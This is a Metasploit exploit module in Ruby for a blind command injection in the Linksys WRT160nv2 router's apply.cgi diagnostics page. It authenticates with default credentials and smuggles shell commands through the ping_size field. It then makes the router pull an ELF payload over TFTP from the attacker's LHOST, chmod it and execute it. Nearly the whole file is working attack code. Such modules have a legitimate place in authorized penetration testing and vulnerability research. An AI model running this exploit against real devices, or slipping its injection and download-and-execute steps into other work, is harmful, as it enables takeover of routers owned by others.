##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'rex/proto/tftp'

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'Linksys WRT160nv2 apply.cgi Remote Command Injection',
      'Description' => %q{
          Some Linksys Routers are vulnerable to an authenticated OS command injection on
        their web interface where default credentials are admin/admin or admin/password.
        Since it is a blind OS command injection vulnerability, there is no output for the
        executed command when using the cmd generic payload. This module has been tested on
        a  Linksys WRT160n version 2 - firmware version v2.0.03. A ping command against a
        controlled system could be used for testing purposes. The exploit uses the tftp
        client from the device to stage to native payloads from the command injection.
      },
      'Author'      =>
        [
          'Michael Messner <devnull@s3cur1ty.de>', # Vulnerability discovery and Metasploit module
          'juan vazquez' # minor help with msf module
        ],
      'License'     => MSF_LICENSE,
      'References'  =>
        [
          [ 'BID', '57887' ],
          [ 'EDB', '24478' ],
          [ 'OSVDB', '90093' ],
          [ 'URL', 'http://www.s3cur1ty.de/m1adv2013-012' ]
        ],
      'DisclosureDate' => 'Feb 11 2013',
      'Privileged'     => true,
      'Platform'       => ['linux','unix'],
      'Payload'        =>
        {
          'DisableNops' => true
        },
      'Targets'        =>
        [
          [ 'CMD',
            {
            'Arch' => ARCH_CMD,
            'Platform' => 'unix'
            }
          ],
          [ 'Linux mipsel Payload',
            {
            'Arch' => ARCH_MIPSLE,
            'Platform' => 'linux'
            }
          ],
        ],
      'DefaultTarget'  => 1
      ))

    register_options(
      [
        OptString.new('USERNAME', [ true, 'The username to authenticate as', 'admin' ]),
        OptString.new('PASSWORD', [ true, 'The password for the specified username', 'admin' ]),
        OptAddress.new('LHOST', [ true, 'The listen IP address from where the victim downloads the MIPS payload' ]),
        OptString.new('DOWNFILE', [ false, 'Filename to download, (default: random)' ]),
        OptInt.new('DELAY', [true, 'Time that the HTTP Server will wait for the ELF payload request', 10])
      ], self.class)
  end


  def request(cmd,user,pass,uri)
    begin
      res = send_request_cgi({
        'uri'    => uri,
        'method' => 'POST',
        'authorization' => basic_auth(user,pass),
        'vars_post' => {
          "submit_button" => "Diagnostics",
          "change_action" => "gozila_cgi",
          "submit_type" => "start_ping",
          "action" => "",
          "commit" => "0",
          "ping_ip" => "1.1.1.1",
          "ping_size" => "&#{cmd}&",
          "ping_times" => "5",
          "traceroute_ip" => ""
        }
      })
      return res
    rescue ::Rex::ConnectionError
      vprint_error("#{rhost}:#{rport} - Failed to connect to the web server")
      return nil
    end
  end

  def exploit
    downfile = datastore['DOWNFILE'] || rand_text_alpha(8+rand(4))
    uri = '/apply.cgi'
    user = datastore['USERNAME']
    pass = datastore['PASSWORD']
    lhost = datastore['LHOST']

    #
    # testing Login
    #
    print_status("#{rhost}:#{rport} - Trying to login with #{user} / #{pass}")
    begin
      res = send_request_cgi({
        'uri'     => uri,
        'method'  => 'GET',
        'authorization' => basic_auth(user,pass)
      })
      if res.nil? or res.code == 404
        fail_with(Exploit::Failure::NoAccess, "#{rhost}:#{rport} - No successful login possible with #{user}/#{pass}")
      end
      if [200, 301, 302].include?(res.code)
        print_good("#{rhost}:#{rport} - Successful login #{user}/#{pass}")
      else
        fail_with(Exploit::Failure::NoAccess, "#{rhost}:#{rport} - No successful login possible with #{user}/#{pass}")
      end
    rescue ::Rex::ConnectionError
      fail_with(Exploit::Failure::Unreachable, "#{rhost}:#{rport} - Failed to connect to the web server")
    end

    if target.name =~ /CMD/
      if not (datastore['CMD'])
        fail_with(Exploit::Failure::BadConfig, "#{rhost}:#{rport} - Only the cmd/generic payload is compatible")
      end
      cmd = payload.encoded
      res = request(cmd,user,pass,uri)
      if (!res)
        fail_with(Exploit::Failure::Unknown, "#{rhost}:#{rport} - Unable to execute payload")
      else
        print_status("#{rhost}:#{rport} - Blind Exploitation - unknown Exploitation state")
      end
      return
    end

    #thx to Juan for his awesome work on the mipsel elf support
    @pl = generate_payload_exe

    #
    # start our server
    #
    print_status("#{rhost}:#{rport} - Starting up our TFTP service")
    @tftp = Rex::Proto::TFTP::Server.new
    @tftp.register_file(downfile,@pl,true)
    @tftp.start

    #
    # download payload
    #
    print_status("#{rhost}:#{rport} - Asking the Linksys device to download #{downfile}")
    #this filename is used to store the payload on the device -> we have limited space for the filename!
    filename = rand_text_alpha_lower(4)

    #not working if we send all command together -> lets take three requests
    cmd = "tftp -l /tmp/#{filename} -r #{downfile} -g #{lhost}"
    res = request(cmd,user,pass,uri)
    if (!res)
      fail_with(Exploit::Failure::Unknown, "#{rhost}:#{rport} - Unable to deploy payload")
    end

    # wait for payload download
    if (datastore['DOWNHOST'])
      print_status("#{rhost}:#{rport} - Giving #{datastore['DELAY']} seconds to the Linksys device to download the payload")
      select(nil, nil, nil, datastore['DELAY'])
    else
      wait_linux_payload
    end
    @tftp.stop
    register_file_for_cleanup("/tmp/#{filename}")

    #
    # chmod
    #
    cmd = "chmod 777 /tmp/#{filename}"
    print_status("#{rhost}:#{rport} - Asking the Linksys device to chmod #{downfile}")
    res = request(cmd,user,pass,uri)
    if (!res)
      fail_with(Exploit::Failure::Unknown, "#{rhost}:#{rport} - Unable to deploy payload")
    end

    #
    # execute
    #
    cmd = "/tmp/#{filename}"
    print_status("#{rhost}:#{rport} - Asking the Linksys device to execute #{downfile}")
    res = request(cmd,user,pass,uri)
    if (!res)
      fail_with(Exploit::Failure::Unknown, "#{rhost}:#{rport} - Unable to deploy payload")
    end

  end

  # wait for the data to be sent
  def wait_linux_payload
    print_status("#{rhost}:#{rport} - Waiting for the victim to request the ELF payload...")

    waited = 0
    while (not @tftp.files.length == 0)
      select(nil, nil, nil, 1)
      waited += 1
      if (waited > datastore['DELAY'])
        @tftp.stop
        fail_with(Exploit::Failure::Unknown, "#{rhost}:#{rport} - Target didn't request request the ELF payload -- Maybe it cant connect back to us?")
      end
    end
  end
end
